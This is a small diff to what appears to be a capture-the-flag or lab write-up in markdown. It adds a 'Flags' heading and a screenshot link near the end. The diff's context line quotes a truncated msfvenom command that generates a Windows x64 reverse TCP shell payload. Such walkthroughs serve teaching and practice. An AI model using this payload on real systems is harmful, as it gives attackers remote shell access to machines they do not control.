@@ -228,6 +228,10 @@ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp L
 
 ![image](https://github.com/user-attachments/assets/a418bfe9-ebbc-44a0-ad01-e1ff0a03b29e)
 
+- Flags-:
+
+![image](https://github.com/user-attachments/assets/80b050c4-d6c3-4e86-81e3-5e75d39587ef)
+
 ------------
 
 ### THANKS FOR READING
